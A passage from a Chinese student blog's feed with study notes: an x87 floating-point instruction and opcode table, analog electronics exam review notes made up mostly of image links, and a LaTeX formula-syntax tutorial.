punctuation">)</span>未使用                   机器码  <span class="token constant">DD</span> <span class="token class-name">C0iii</span>  <span class="token constant">FDECSTP</span>               减少栈指针<span class="token number">1</span><span class="token punctuation">-></span><span class="token number">0</span> <span class="token number">2</span><span class="token punctuation">-></span><span class="token number">1</span>             机器码  <span class="token constant">D9</span> <span class="token constant">F6</span>  <span class="token constant">FINCSTP</span>               增加栈指针<span class="token number">0</span><span class="token punctuation">-></span><span class="token number">1</span> <span class="token number">1</span><span class="token punctuation">-></span><span class="token number">2</span>             机器码  <span class="token constant">D9</span> <span class="token constant">F7</span>  <span class="token constant">FSETPM</span>                浮点设置保护                       机器码  <span class="token constant">DB</span> <span class="token constant">E4</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二、数据传送指令"><a href="#二、数据传送指令" class="headerlink" title="二、数据传送指令"></a>二、数据传送指令</h3><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">FLDZ                  将<span class="token number">0.0</span>装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                  机器码  D9 EE  FLD1                  将<span class="token number">1.0</span>装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                  机器码  D9 E8  FLDPI                 将π装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                    机器码  D9 EB  FLDL2T                将ln10<span class="token operator">/</span>ln2装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>             机器码  D9 E9  FLDL2E                将<span class="token number">1</span><span class="token operator">/</span>ln2装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                机器码  D9 EA  FLDLG2                将ln2<span class="token operator">/</span>ln10装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>             机器码  D9 EC  FLDLN2                将ln2装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                  机器码  D9 ED    FLD    real4 ptr mem  装入mem的单精度浮点数             机器码  D9 mm000mmm  FLD    real8 ptr mem  装入mem的双精度浮点数             机器码  DD mm000mmm  FLD   real10 ptr mem  装入mem的十字节浮点数             机器码  DB mm101mmm    FILD    word ptr mem  装入mem的二字节整数              机器码  DF mm000mmm  FILD   dword ptr mem  装入mem的四字节整数              机器码  DB mm000mmm  FILD   qword ptr mem  装入mem的八字节整数              机器码  DF mm101mmm    FBLD   tbyte ptr mem  装入mem的十字节BCD数            机器码  DF mm100mmm    FST    real4 ptr mem  保存单精度浮点数到mem             机器码  D9 mm010mmm  FST    real8 ptr mem  保存双精度浮点数到mem             机器码  DD mm010mmm    FIST    word ptr mem  保存二字节整数到mem              机器码  DF mm010mmm  FIST   dword ptr mem  保存四字节整数到mem              机器码  DB mm010mmm    FSTP   real4 ptr mem  保存单精度浮点数到mem并出栈      机器码  D9 mm011mmm  FSTP   real8 ptr mem  保存双精度浮点数到mem并出栈      机器码  DD mm011mmm  FSTP  real10 ptr mem  保存十字节浮点数到mem并出栈      机器码  DB mm111mmm    FISTP   word ptr mem  保存二字节整数到mem并出栈           机器码  DF mm011mmm  FISTP  dword ptr mem  保存四字节整数到mem并出栈           机器码  DB mm011mmm  FISTP  qword ptr mem  保存八字节整数到mem并出栈           机器码  DF mm111mmm    FBSTP  tbyte ptr mem  保存十字节BCD数到mem并出栈     机器码  DF mm110mmm    <span class="token return-type class-name">FCMOVB</span>                <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;</span>时传送              机器码  DA C0iii  <span class="token return-type class-name">FCMOVBE</span>               <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span>时传送             机器码  DA D0iii  <span class="token return-type class-name">FCMOVE</span>                <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">=</span>时传送             机器码  DA C1iii  <span class="token return-type class-name">FCMOVNB</span>               <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">>=</span>时传送             机器码  DB C0iii  <span class="token return-type class-name">FCMOVNBE</span>              <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">></span>时传送              机器码  DB D0iii  <span class="token return-type class-name">FCMOVNE</span>               <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">!=</span>时传送            机器码  DB C1iii  <span class="token return-type class-name">FCMOVNU</span>               <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> 有序时传送        机器码  DB D1iii  <span class="token return-type class-name">FCMOVU</span>                <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> 无序时传送        机器码  DA D1iii  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三、比较指令"><a href="#三、比较指令" class="headerlink" title="三、比较指令"></a>三、比较指令</h3><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">FCOM                  ST(0)-ST(1)                      机器码  D8 D1  FCOMI                 ST(0),ST(i)  ST(0)-ST(1)         机器码  DB F0iii  FCOMIP                ST(0),ST(i)  ST(0)-ST(1)并出栈   机器码  DF F0iii  FCOM   real4 ptr mem  ST(0)-实数mem                      机器码  D8 mm010mmm  FCOM   real8 ptr mem  ST(0)-实数mem                      机器码  DC mm010mmm    FICOM   word ptr mem  ST(0)-整数mem                      机器码  DE mm010mmm  FICOM  dword ptr mem  ST(0)-整数mem                      机器码  DA mm010mmm  FICOMP  word ptr mem  ST(0)-整数mem并出栈               机器码  DE mm011mmm  FICOMP dword ptr mem  ST(0)-整数mem并出栈               机器码  DA mm011mmm    FTST                  ST(0)-0                          机器码  D9 E4  FUCOM  ST(i)          ST(0)-ST(i)                      机器码  DD E0iii  FUCOMP ST(i)          ST(0)-ST(i)并出栈                   机器码  DD E1iii  FUCOMPP               ST(0)-ST(1)并二次出栈             机器码  DA E9  FXAM                  ST(0)规格类型                    机器码  D9 E5  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="四、运算指令"><a href="#四、运算指令" class="headerlink" title="四、运算指令"></a>四、运算指令</h3><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">FADD                  把目的操作数 (直接接在指令后的变量或堆栈缓存器) 与来源操作数 (接在目的操作数后的变量或堆栈缓存器)  相加，并将结果存入目的操作数  FADDP  ST(i),ST       这个指令是使目的操作数加上 ST  缓存器，并弹出 ST 缓存器，而目的操作数必须是堆栈缓存器的其中之一，最后不管目的操作数为何，经弹出一次后，目的操作数会变成上一个堆栈缓存器了  FIADD                 FIADD 是把 ST   加上来源操作数，然后再存入 ST 缓存器，来源操作数必须是字组整数或短整数形态的变数    FSUB                  减  FSUBP  FSUBR                 减数与被减数互换  FSUBRP  FISUB  FISUBR    FMUL                  乘  FMULP  FIMUL    FDIV                  除  FDIVP  FDIVR  FDIVRP  FIDIV  FIDIVR    FCHS                  改变 ST 的正负值    FABS                  把 ST  之值取出，取其绝对值后再存回去。    FSQRT                 将 ST  之值取出，开根号后再存回去。    FSCALE                这个指令是计算 ST*2^ST(1)之值，再把结果存入 ST 里而 ST(1)   之值不变。ST(1)  必须是在 -32768 到 32768 (-215 到 215 )之间的整数，如果超过这个范围计算结果无法确定，如果不是整数 ST(1)    会先向零舍入成整数再计算。所以为安全起见，最好是由字组整数载入到 ST(1) 里。    FRNDINT               这个指令是把 ST 的数值舍入成整数，FPU    提供四种舍入方式，由 FPU 的控制字组(control    word)中的 RC 两个位决定                            RC    舍入控制                            00    四舍五入                            01    向负无限大舍入                            10    向正无限大舍入                            11    向零舍去  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模电</title>
      <link href="2021/04/17/%E6%A8%A1%E7%94%B5/"/>
      <url>2021/04/17/%E6%A8%A1%E7%94%B5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="电子技术基础"><a href="#电子技术基础" class="headerlink" title="电子技术基础"></a>电子技术基础</h1><h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107181426892.png" alt="image-20210107181426892" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107181625933.png" alt="image-20210107181625933" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107181646995.png" alt="image-20210107181646995" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107181741152.png" alt="image-20210107181741152" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107181758888.png" alt="image-20210107181758888" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107181811199.png" alt="image-20210107181811199" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107181936348.png" alt="image-20210107181936348" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107181957992.png" alt="image-20210107181957992" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107182312982.png" alt="image-20210107182312982" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107182336364.png" alt="image-20210107182336364" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107182352864.png" alt="image-20210107182352864" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107182820982.png" alt="image-20210107182820982" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107182907346.png" alt="image-20210107182907346" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107183450567.png" alt="image-20210107183450567" loading="lazy"></p><h2 id="填空题"><a href="#填空题" class="headerlink" title="填空题"></a>填空题</h2><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107182645834.png" alt="image-20210107182645834" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107182717578.png" alt="image-20210107182717578" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107182943184.png" alt="image-20210107182943184" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107183420655.png" alt="image-20210107183420655" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107183514871.png" alt="image-20210107183514871" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107183546266.png" alt="image-20210107183546266" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107183603061.png" alt="image-20210107183603061" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107183649229.png" alt="image-20210107183649229" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107183704117.png" alt="image-20210107183704117" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107183730788.png" alt="image-20210107183730788" loading="lazy"></p><p>这是电压串联正反馈</p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107183744417.png" alt="image-20210107183744417" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210107183800733.png" alt="image-20210107183800733" loading="lazy"></p><h2 id="大题（部分应该是考选择）学会这里就够了，概念什么的就看造化了"><a href="#大题（部分应该是考选择）学会这里就够了，概念什么的就看造化了" class="headerlink" title="大题（部分应该是考选择）学会这里就够了，概念什么的就看造化了"></a>大题（部分应该是考选择）学会这里就够了，概念什么的就看造化了</h2><h3 id="第一章直流电路"><a href="#第一章直流电路" class="headerlink" title="第一章直流电路"></a>第一章直流电路</h3><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210109131645454.png" alt="image-20210109131645454" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210109131723232.png" alt="image-20210109131723232" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210109131752113.png" alt="image-20210109131752113" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210109131842058.png" alt="image-20210109131842058" loading="lazy"></p><h3 id="第二章暂态分析"><a href="#第二章暂态分析" class="headerlink" title="第二章暂态分析"></a>第二章暂态分析</h3><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210109183919397.png" alt="image-20210109183919397" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210109183945731.png" alt="image-20210109183945731" loading="lazy"></p><h3 id="第四章模拟集成运算放大器"><a href="#第四章模拟集成运算放大器" class="headerlink" title="第四章模拟集成运算放大器"></a>第四章模拟集成运算放大器</h3><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210109231413316.png" alt="image-20210109231413316" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210109231434251.png" alt="image-20210109231434251" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210109231456114.png" alt="image-20210109231456114" loading="lazy"></p><h3 id="第五章半导体二极管及稳流电压"><a href="#第五章半导体二极管及稳流电压" class="headerlink" title="第五章半导体二极管及稳流电压"></a>第五章半导体二极管及稳流电压</h3><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210109190700745.png" alt="image-20210109190700745" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210109190802683.png" alt="image-20210109190802683" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210109190843704.png" alt="image-20210109190843704" loading="lazy"></p><h3 id="第六章晶体三极管及其放大"><a href="#第六章晶体三极管及其放大" class="headerlink" title="第六章晶体三极管及其放大"></a>第六章晶体三极管及其放大<img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210110192823664.png" alt="image-20210110192823664" loading="lazy"></h3><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210110192849501.png" alt="image-20210110192849501" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210110192918406.png" alt="image-20210110192918406" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210110192942469.png" alt="image-20210110192942469" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210110193012641.png" alt="image-20210110193012641" loading="lazy"></p><h3 id="第九章负反馈放大电路"><a href="#第九章负反馈放大电路" class="headerlink" title="第九章负反馈放大电路"></a>第九章负反馈放大电路</h3><p>看填空题</p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210110193031579.png" alt="image-20210110193031579" loading="lazy"></p><h2 id="直流电路"><a href="#直流电路" class="headerlink" title="直流电路"></a>直流电路</h2><h3 id="关联参考方向"><a href="#关联参考方向" class="headerlink" title="关联参考方向"></a>关联参考方向</h3><p>关联：P=UI</p><p>非关联：P=-UI</p><p>关联和非关联有相对性</p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210108001709442.png" alt="image-20210108001709442" loading="lazy"></p><p><strong>两个，关联和非关联</strong></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210108001804586.png" alt="image-20210108001804586" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210108001842686.png" alt="image-20210108001842686" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210108001909977.png" alt="image-20210108001909977" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210108002438159.png" alt="image-20210108002438159" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210108002929029.png" alt="image-20210108002929029" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210108003319502.png" alt="image-20210108003319502" loading="lazy"><br><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210108005133507.png" alt="image-20210108005133507" loading="lazy"></p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210108003616287.png" alt="image-20210108003616287" loading="lazy"></p><p>一般说的电压源电流源都是理想状态下的</p><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210108003636629.png" alt="image-20210108003636629" loading="lazy"></p><h3 id="基尔霍夫定律（KCL和KVL）"><a href="#基尔霍夫定律（KCL和KVL）" class="headerlink" title="基尔霍夫定律（KCL和KVL）"></a>基尔霍夫定律（KCL和KVL）</h3><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210108005705257.png" alt="image-20210108005705257" loading="lazy"></p><p>KCL:节点流出电流之和等于流入电流之和</p><p>KVL:任何闭合回路绕行一周各支路的电压代数和恒等于为0</p><h3 id="等效电路"><a href="#等效电路" class="headerlink" title="等效电路"></a>等效电路</h3><p>等效是指外电路等效，内部结构不一定一样</p><p><strong>电阻等效</strong></p><pre><code>串联等效，并联等效，串并联等效</code></pre><p><strong>电源等效</strong></p><pre><code>电压源串联等效，电流源并联等效，电压源与元件并联等效（可去掉元件），电流与元件串联等效（可去掉元件）</code></pre><h3 id="节点点位分析法"><a href="#节点点位分析法" class="headerlink" title="节点点位分析法"></a>节点点位分析法</h3><h3 id="叠加定理"><a href="#叠加定理" class="headerlink" title="叠加定理"></a>叠加定理</h3><p>在多个源的电路中，让其中一个源单独工作，其余电源置零</p><h3 id="戴维南定理"><a href="#戴维南定理" class="headerlink" title="戴维南定理"></a>戴维南定理</h3><h2 id="暂态分析"><a href="#暂态分析" class="headerlink" title="暂态分析"></a>暂态分析</h2><p><img src="/2021/04/17/%E6%A8%A1%E7%94%B5/image-20210109142028524.png" alt="image-20210109142028524" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 模电 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教程</title>
      <link href="2021/03/07/jiaocheng/"/>
      <url>2021/03/07/jiaocheng/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token equation string">$$ E = mc^2 $$</span><span class="token equation string">\[ E = mc^2 \]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>$$ E = mc^2 $$<br>[ E = mc^2 ]</p><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token equation string">$E = mc^2$</span><span class="token equation string">$<span class="token equation-command regex">\frac</span>&#123;<span class="token equation-command regex">\partial</span>&#125;&#123;<span class="token equation-command regex">\partial</span> t&#125;$</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>$E = mc^2$<br>$\frac{\partial}{\partial t}$<br>$\frac{7x+5}{1+y^2}$</p><p>$z=z_l$</p><p>$\cdots$</p><p>$\frac{d}{dx}e^{ax}=ae^{ax}\quad \sum_{i=1}^{n}{(X_i - \overline{X})^2}$</p><p>$\sqrt{2};\sqrt[n]{3}$</p><p>$\vec{a} \cdot \vec{b}=0$</p><p>$\int ^2_3 x^2 {\rm d}x$<br>$\iint$<br>$\iiint$<br>$\oint$<br>$\oint$<br>$\mathrm{d}$<br>$\prime$<br>$\lim$<br>$\infty$<br>$\partial$<br>$\sum$</p><h2 id="行内与独行"><a href="#行内与独行" class="headerlink" title="行内与独行"></a>行内与独行</h2><ol><li>行内公式：将公式插入到本行内，符号：<code>$公式内容$</code>，如：$xyz$</li><li>独行公式：将公式插入到新的一行内，并且居中，符号：<code>$$公式内容$$</code>，如：$$xyz$$</li></ol><h2 id="上标、下标与组合"><a href="#上标、下标与组合" class="headerlink" title="上标、下标与组合"></a>上标、下标与组合</h2><ol><li>上标符号，符号：<code>^</code>，如：$x^4$</li><li>下标符号，符号：<code>_</code>，如：$x_1$</li><li>组合符号，符号：<code>&#123;&#125;</code>，如：${16}<em>{8}O{2+}</em>{2}$</li></ol><h2 id="汉字、字体与格式"><a href="#汉字、字体与格式" class="headerlink" title="汉字、字体与格式"></a>汉字、字体与格式</h2><ol><li>汉字形式，符号：<code>\mbox&#123;&#125;</code>，如：$V_{\mbox{初始}}$</li><li>字体控制，符号：<code>\displaystyle</code>，如：$\displaystyle \frac{x+y}{y+z}$</li><li>下划线符号，符号：<code>\underline</code>，如：$\underline{x+y}$</li><li>标签，符号<code>\tag&#123;数字&#125;</code>，如：$\tag{11}$</li><li>上大括号，符号：<code>\overbrace&#123;算式&#125;</code>，如：$\overbrace{a+b+c+d}^{2.0}$</li><li>下大括号，符号：<code>\underbrace&#123;算式&#125;</code>，如：$a+\underbrace{b+c}_{1.0}+d$</li><li>上位符号，符号：<code>\stacrel&#123;上位符号&#125;&#123;基位符号&#125;</code>，如：$\vec{x}\stackrel{\mathrm{def}}{=}{x_1,\dots,x_n}$</li></ol><h2 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h2><ol><li>两个quad空格，符号：<code>\qquad</code>，如：$x \qquad y$</li><li>quad空格，符号：<code>\quad</code>，如：$x \quad y$</li><li>大空格，符号<code>\</code>，如：$x \  y$</li><li>中空格，符号<code>\:</code>，如：$x : y$</li><li>小空格，符号<code>\,</code>，如：$x , y$</li><li>没有空格，符号``，如：$xy$</li><li>紧贴，符号<code>\!</code>，如：$x ! y$</li></ol><h2 id="定界符与组合"><a href="#定界符与组合" class="headerlink" title="定界符与组合"></a>定界符与组合</h2><ol><li>括号，符号：<code>（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)</code>，如：$（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)$</li><li>中括号，符号：<code>[]</code>，如：$[x+y]$</li><li>大括号，符号：<code>\&#123; \&#125;</code>，如：${x+y}$</li><li>自适应括号，符号：<code>\left \right</code>，如：$\left(x\right)$，$\left(x{yz}\right)$</li><li>组合公式，符号：<code>&#123;上位公式 \choose 下位公式&#125;</code>，如：${n+1 \choose k}={n \choose k}+{n \choose k-1}$</li><li>组合公式，符号：<code>&#123;上位公式 \atop 下位公式&#125;</code>，如：$\sum_{k_0,k_1,\ldots&gt;0 \atop k_0+k_1+\cdots=n}A_{k_0}A_{k_1}\cdots$</li></ol><h2 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h2><ol><li>加法运算，符号：<code>+</code>，如：$x+y=z$</li><li>减法运算，符号：<code>-</code>，如：$x-y=z$</li><li>加减运算，符号：<code>\pm</code>，如：$x \pm y=z$</li><li>减甲运算，符号：<code>\mp</code>，如：$x \mp y=z$</li><li>乘法运算，符号：<code>\times</code>，如：$x \times y=z$</li><li>点乘运算，符号：<code>\cdot</code>，如：$x \cdot y=z$</li><li>星乘运算，符号：<code>\ast</code>，如：$x \ast y=z$</li><li>除法运算，符号：<code>\div</code>，如：$x \div y=z$</li><li>斜法运算，符号：<code>/</code>，如：$x/y=z$</li><li>分式表示，符号：<code>\frac&#123;分子&#125;&#123;分母&#125;</code>，如：$\frac{x+y}{y+z}$</li><li>分式表示，符号：<code>&#123;分子&#125; \voer &#123;分母&#125;</code>，如：${x+y} \over {y+z}$</li><li>绝对值表示，符号：<code>||</code>，如：$|x+y|$</li></ol><h2 id="高级运算"><a href="#高级运算" class="headerlink" title="高级运算"></a>高级运算</h2><ol><li>平均数运算，符号：<code>\overline&#123;算式&#125;</code>，如：$\overline{xyz}$</li><li>开二次方运算，符号：<code>\sqrt</code>，如：$\sqrt x$</li><li>开方运算，符号：<code>\sqrt[开方数]&#123;被开方数&#125;</code>，如：$\sqrt[3]{x+y}$</li><li>对数运算，符号：<code>\log</code>，如：$\log(x)$</li><li>极限运算，符号：<code>\lim</code>，如：$\lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>极限运算，符号：<code>\displaystyle \lim</code>，如：$\displaystyle \lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>求和运算，符号：<code>\sum</code>，如：$\sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>求和运算，符号：<code>\displaystyle \sum</code>，如：$\displaystyle \sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>积分运算，符号：<code>\int</code>，如：$\int^{\infty}_{0}{xdx}$</li><li>积分运算，符号：<code>\displaystyle \int</code>，如：$\displaystyle \int^{\infty}_{0}{xdx}$</li><li>微分运算，符号：<code>\partial</code>，如：$\frac{\partial x}{\partial y}$</li><li>矩阵表示，符号：<code>\begin&#123;matrix&#125; \end&#123;matrix&#125;</code>，如：$\left[ \begin{matrix} 1 &amp;2 &amp;\cdots &amp;4\5 &amp;6 &amp;\cdots &amp;8\vdots &amp;\vdots &amp;\ddots &amp;\vdots\13 &amp;14 &amp;\cdots &amp;16\end{matrix} \right]$</li></ol><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><ol><li>等于运算，符号：<code>=</code>，如：$x+y=z$</li><li>大于运算，符号：<code>&gt;</code>，如：$x+y&gt;z$</li><li>小于运算，符号：<code>&lt;</code>，如：$x+y&lt;z$</li><li>大于等于运算，符号：<code>\geq</code>，如：$x+y \geq z$</li><li>小于等于运算，符号：<code>\leq</code>，如：$x+y \leq z$</li><li>不等于运算，符号：<code>\neq</code>，如：$x+y \neq z$</li><li>不大于等于运算，符号：<code>\ngeq</code>，如：$x+y \ngeq z$</li><li>不大于等于运算，符号：<code>\not\geq</code>，如：$x+y \not\geq z$</li><li>不小于等于运算，符号：<code>\nleq</code>，如：$x+y \nleq z$</li><li>不小于等于运算，符号：<code>\not\leq</code>，如：$x+y \not\leq z$</li><li>约等于运算，符号：<code>\approx</code>，如：$x+y \approx z$</li><li>恒定等于运算，符号：<code>\equiv</code>，如：$x+y \equiv z$</li></ol><h2 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h2><ol><li>属于运算，符号：<code>\in</code>，如：$x \in y$</li><li>不属于运算，符号：<code>\notin</code>，如：$x \notin y$</li><li>不属于运算，符号：<code>\not\in</code>，如：$x \not\in y$</li><li>子集运算，符号：<code>\subset</code>，如：$x \subset y$</li><li>子集运算，符号：<code>\supset</code>，如：$x \supset y$</li><li>真子集运算，符号：<code>\subseteq</code>，如：$x \subseteq y$</li><li>非真子集运算，符号：<code>\subsetneq</code>，如：$x \subsetneq y$</li><li>真子集运算，符号：<code>\supseteq</code>，如：$x \supseteq y$</li><li>非真子集运算，符号：<code>\supsetneq</code>，如：$x \supsetneq y$</li><li>非子集运算，符号：<code>\not\subset</code>，如：$x \not\subset y$</li><li>非子集运算，符号：<code>\not\supset</code>，如：$x \not\supset y$</li><li>并集运算，符号：<code>\cup</code>，如：$x \cup y$</li><li>交集运算，符号：<code>\cap</code>，如：$x \cap y$</li><li>差集运算，符号：<code>\setminus</code>，如：$x \setminus 